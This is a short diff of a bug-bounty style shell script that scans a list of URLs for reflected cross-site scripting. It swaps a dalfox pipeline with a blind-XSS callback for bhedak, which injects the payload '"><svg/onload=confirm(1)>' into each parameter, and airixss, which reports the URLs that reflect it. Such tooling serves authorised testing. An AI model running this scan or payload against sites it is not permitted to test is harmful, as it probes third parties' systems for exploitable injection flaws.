@@ -2,6 +2,5 @@
 #Coded by @lemosnlmb
 
 list=$1
-blindxss=$2
 
-cat $list | uro | grep "=" | kxss | awk '{print $2}'| dalfox pipe -b $blindxss --skip-bav --silence
+cat $list | bhedak '"><svg/onload=confirm(1)>' | airixss -p "confirm(1)" | grep -v "Not Vulnerable to XSS"
